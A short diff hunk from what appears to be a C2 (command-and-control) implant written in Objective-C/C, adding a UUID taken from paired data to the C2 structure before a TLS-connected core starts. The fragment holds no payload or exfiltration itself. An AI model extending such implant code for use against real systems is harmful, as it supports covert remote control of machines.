@@ -101,6 +101,11 @@ int main(int argc, const char *argv[]) {
         c2_add_sock(&c2, 0, sock, NET_PROTO_TLS);
         c2->path = realpath(argv[0], NULL);
 
+        if ([pairedData count] >= 3)
+        {
+            c2->uuid = strdup([pairedData[2] UTF8String]);
+        }
+
         core = core_create(c2);
         core_start(core);
 
